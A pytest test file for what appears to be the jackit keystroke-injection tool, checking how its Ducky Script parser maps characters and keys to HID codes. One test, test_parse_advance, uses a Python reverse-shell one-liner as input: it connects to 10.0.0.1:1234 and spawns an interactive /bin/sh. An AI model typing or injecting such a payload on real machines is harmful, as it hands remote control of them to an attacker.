import pytest
import jackit

def test_char_to_hid():
    '''basic test of char to hid '''
    dp = jackit.DuckyParser("test")
    assert dp.char_to_hid('a') == [4, False]
    assert dp.char_to_hid('A') == [4, True]
    assert dp.char_to_hid('UP') == [82, False]


def test_parse_repeat():
    dp = jackit.DuckyParser("""
STRING Hello
REPEAT 5
""")
    assert dp.parse() == [{'char': 'H', 'meta': False, 'hid': 11, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': 'e', 'meta': False, 'hid': 8, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'l', 'meta': False, 'hid': 15, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'l', 'meta': False, 'hid': 15, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'o', 'meta': False, 'hid': 18, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'H', 'meta': False, 'hid': 11, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': 'e', 'meta': False, 'hid': 8, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'l', 'meta': False, 'hid': 15, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'l', 'meta': False, 'hid': 15, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'o', 'meta': False, 'hid': 18, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'H', 'meta': False, 'hid': 11, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': 'e', 'meta': False, 'hid': 8, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'l', 'meta': False, 'hid': 15, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'l', 'meta': False, 'hid': 15, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'o', 'meta': False, 'hid': 18, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'H', 'meta': False, 'hid': 11, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': 'e', 'meta': False, 'hid': 8, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'l', 'meta': False, 'hid': 15, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'l', 'meta': False, 'hid': 15, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'o', 'meta': False, 'hid': 18, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'H', 'meta': False, 'hid': 11, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': 'e', 'meta': False, 'hid': 8, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'l', 'meta': False, 'hid': 15, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'l', 'meta': False, 'hid': 15, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'o', 'meta': False, 'hid': 18, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0}]

def test_parse():
    dp = jackit.DuckyParser("test")
    assert dp.parse() == []

    dp = jackit.DuckyParser("GUI r\n")
    assert dp.parse() == [{'alt': False, 'char': 'r', 'ctrl': False, 'hid': 21, 'meta': True, 'shift': False, 'sleep': 0}]

def test_parse_arrowkeys():
    dp = jackit.DuckyParser('UP')
    assert dp.parse() == [{'char': 'UP', 'meta': False, 'hid': 82, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0}]
    dp = jackit.DuckyParser('DOWN')
    assert dp.parse() == [{'char': 'DOWN', 'meta': False, 'hid': 81, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0}]
    dp = jackit.DuckyParser('LEFT')
    assert dp.parse() == [{'char': 'LEFT', 'meta': False, 'hid': 80, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0}]
    dp = jackit.DuckyParser('RIGHT')
    assert dp.parse() == [{'char': 'RIGHT', 'meta': False, 'hid': 79, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0}]


def test_parse_advance():
    dp = jackit.DuckyParser("""
STRING python -c'import socket,os;s=socket.socket();s.connect(("10.0.0.1",1234));h=s.fileno();d=os.dup2;d(h,0);d(h,1);d(h,2);os.execl("/bin/sh","-i")'
ENTER
    """)
    assert dp.parse() == [{'char': 'p', 'meta': False, 'hid': 19, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'y', 'meta': False, 'hid': 28, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 't', 'meta': False, 'hid': 23, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'h', 'meta': False, 'hid': 11, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'o', 'meta': False, 'hid': 18, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'n', 'meta': False, 'hid': 17, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': ' ', 'meta': False, 'hid': 44, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '-', 'meta': False, 'hid': 45, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'c', 'meta': False, 'hid': 6, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': "'", 'meta': False, 'hid': 52, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'i', 'meta': False, 'hid': 12, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'm', 'meta': False, 'hid': 16, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'p', 'meta': False, 'hid': 19, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'o', 'meta': False, 'hid': 18, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'r', 'meta': False, 'hid': 21, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 't', 'meta': False, 'hid': 23, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': ' ', 'meta': False, 'hid': 44, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 's', 'meta': False, 'hid': 22, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'o', 'meta': False, 'hid': 18, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'c', 'meta': False, 'hid': 6, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'k', 'meta': False, 'hid': 14, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'e', 'meta': False, 'hid': 8, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 't', 'meta': False, 'hid': 23, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': ',', 'meta': False, 'hid': 54, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'o', 'meta': False, 'hid': 18, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 's', 'meta': False, 'hid': 22, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': ';', 'meta': False, 'hid': 51, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 's', 'meta': False, 'hid': 22, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '=', 'meta': False, 'hid': 46, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 's', 'meta': False, 'hid': 22, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'o', 'meta': False, 'hid': 18, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'c', 'meta': False, 'hid': 6, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'k', 'meta': False, 'hid': 14, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'e', 'meta': False, 'hid': 8, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 't', 'meta': False, 'hid': 23, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '.', 'meta': False, 'hid': 55, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 's', 'meta': False, 'hid': 22, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'o', 'meta': False, 'hid': 18, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'c', 'meta': False, 'hid': 6, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'k', 'meta': False, 'hid': 14, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'e', 'meta': False, 'hid': 8, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 't', 'meta': False, 'hid': 23, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '(', 'meta': False, 'hid': 38, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': ')', 'meta': False, 'hid': 39, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': ';', 'meta': False, 'hid': 51, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 's', 'meta': False, 'hid': 22, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '.', 'meta': False, 'hid': 55, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'c', 'meta': False, 'hid': 6, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'o', 'meta': False, 'hid': 18, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'n', 'meta': False, 'hid': 17, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'n', 'meta': False, 'hid': 17, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'e', 'meta': False, 'hid': 8, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'c', 'meta': False, 'hid': 6, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 't', 'meta': False, 'hid': 23, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '(', 'meta': False, 'hid': 38, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': '(', 'meta': False, 'hid': 38, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': '"', 'meta': False, 'hid': 52, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': '1', 'meta': False, 'hid': 30, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '0', 'meta': False, 'hid': 39, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '.', 'meta': False, 'hid': 55, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '0', 'meta': False, 'hid': 39, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '.', 'meta': False, 'hid': 55, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '0', 'meta': False, 'hid': 39, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '.', 'meta': False, 'hid': 55, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '1', 'meta': False, 'hid': 30, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '"', 'meta': False, 'hid': 52, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': ',', 'meta': False, 'hid': 54, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '1', 'meta': False, 'hid': 30, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '2', 'meta': False, 'hid': 31, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '3', 'meta': False, 'hid': 32, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '4', 'meta': False, 'hid': 33, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': ')', 'meta': False, 'hid': 39, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': ')', 'meta': False, 'hid': 39, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': ';', 'meta': False, 'hid': 51, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'h', 'meta': False, 'hid': 11, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '=', 'meta': False, 'hid': 46, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 's', 'meta': False, 'hid': 22, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '.', 'meta': False, 'hid': 55, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'f', 'meta': False, 'hid': 9, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'i', 'meta': False, 'hid': 12, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'l', 'meta': False, 'hid': 15, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'e', 'meta': False, 'hid': 8, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'n', 'meta': False, 'hid': 17, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'o', 'meta': False, 'hid': 18, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '(', 'meta': False, 'hid': 38, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': ')', 'meta': False, 'hid': 39, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': ';', 'meta': False, 'hid': 51, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'd', 'meta': False, 'hid': 7, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '=', 'meta': False, 'hid': 46, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'o', 'meta': False, 'hid': 18, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 's', 'meta': False, 'hid': 22, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '.', 'meta': False, 'hid': 55, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'd', 'meta': False, 'hid': 7, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'u', 'meta': False, 'hid': 24, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'p', 'meta': False, 'hid': 19, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '2', 'meta': False, 'hid': 31, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': ';', 'meta': False, 'hid': 51, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'd', 'meta': False, 'hid': 7, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '(', 'meta': False, 'hid': 38, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': 'h', 'meta': False, 'hid': 11, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': ',', 'meta': False, 'hid': 54, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '0', 'meta': False, 'hid': 39, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': ')', 'meta': False, 'hid': 39, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': ';', 'meta': False, 'hid': 51, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'd', 'meta': False, 'hid': 7, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '(', 'meta': False, 'hid': 38, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': 'h', 'meta': False, 'hid': 11, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': ',', 'meta': False, 'hid': 54, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '1', 'meta': False, 'hid': 30, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': ')', 'meta': False, 'hid': 39, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': ';', 'meta': False, 'hid': 51, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'd', 'meta': False, 'hid': 7, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '(', 'meta': False, 'hid': 38, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': 'h', 'meta': False, 'hid': 11, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': ',', 'meta': False, 'hid': 54, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '2', 'meta': False, 'hid': 31, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': ')', 'meta': False, 'hid': 39, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': ';', 'meta': False, 'hid': 51, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'o', 'meta': False, 'hid': 18, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 's', 'meta': False, 'hid': 22, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '.', 'meta': False, 'hid': 55, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'e', 'meta': False, 'hid': 8, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'x', 'meta': False, 'hid': 27, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'e', 'meta': False, 'hid': 8, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'c', 'meta': False, 'hid': 6, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'l', 'meta': False, 'hid': 15, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '(', 'meta': False, 'hid': 38, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': '"', 'meta': False, 'hid': 52, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': '/', 'meta': False, 'hid': 56, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'b', 'meta': False, 'hid': 5, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'i', 'meta': False, 'hid': 12, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'n', 'meta': False, 'hid': 17, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '/', 'meta': False, 'hid': 56, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 's', 'meta': False, 'hid': 22, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'h', 'meta': False, 'hid': 11, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '"', 'meta': False, 'hid': 52, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': ',', 'meta': False, 'hid': 54, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '"', 'meta': False, 'hid': 52, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': '-', 'meta': False, 'hid': 45, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': 'i', 'meta': False, 'hid': 12, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '"', 'meta': False, 'hid': 52, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': ')', 'meta': False, 'hid': 39, 'ctrl': False, 'shift': True, 'alt': False, 'sleep': 0},
                          {'char': "'", 'meta': False, 'hid': 52, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0},
                          {'char': '\n', 'meta': False, 'hid': 40, 'ctrl': False, 'shift': False, 'alt': False, 'sleep': 0}]
